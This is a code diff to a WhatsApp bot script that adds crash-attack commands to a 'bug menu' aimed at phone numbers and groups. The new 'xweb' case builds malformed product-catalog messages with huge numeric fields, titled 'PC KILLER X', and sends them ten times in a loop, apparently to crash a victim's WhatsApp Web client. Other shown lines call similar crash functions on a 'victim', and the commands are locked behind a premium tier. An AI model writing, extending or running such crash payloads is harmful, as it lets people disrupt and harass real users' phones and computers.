@@ -1102,8 +1102,14 @@ const bugmenu = `┏━━━「 𝐕𝐈𝐏 ☇ 𝐓𝐙𝐘︎ 」━━━�
 │ ◈ ios 628xxxx
 │ ◈ crashios 628xxxx
 │ ◈ 
-│ ◈ New Bug
+│ ◈ *New Bug*
 │ ◈ xdroid 628xxxx
+│ ◈ xweb 628xxxxxxx
+│ ◈ 
+│ ◈ *New Bug Group*
+│ ◈ xgroup 123xxxxxxxx@g.us
+│ ◈ 
+│ ◈ 
 ┗─────────────❐`
 let sections = [{
 title: '⿻  ⌜ 𝐕𝐈𝐏 ☇ 𝐓𝐙𝐘 ⌟  ⿻',
@@ -2368,6 +2374,51 @@ await xgc3(victim);
 await xgc4(victim);
 await sleep(10000); // Delay for 5 seconds
     }
+break
+
+case 'xweb':
+if (!isPremium) return replygcxeon(mess.premium)
+try {
+for (let i = 0; i < 10; i++) {
+messa = await prepareWAMessageMedia({
+image: {
+url: `https://pic.re/image`
+}
+}, {
+upload: viper.waUploadToServer
+})
+catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
+"productMessage": {
+"product": {
+"productImage": messa.imageMessage,
+"productId": "449756950375071",
+"itemCount": 99999999999,
+"title": `PC KILLER X 🦄드림 가이 Xeon`,
+"description": ``,
+"currencyCodeIso4217": "IDR",
+"footerText": ``,
+"productImageCount": 99999999999999999999,
+"firstImageId": 9999999999,
+"priceAmount1000": "999",
+"salePriceAmount1000": "IDR 99.99999999999999999999",
+"thumbnail": messa.imageMessage,
+"jpegThumbnail": m,
+"firstImageId": 99999999,
+"url": "wa.me/5512981791389"
+},
+"businessOwnerJid": from,
+}
+}), {
+userJid: viper.user.id,
+quoted: null
+})
+viper.relayMessage(from, catalog.message, {
+messageId: catalog.key.id
+})
+}
+} catch (e) {
+console.log(e);
+}
 break
 
 case "owner": {
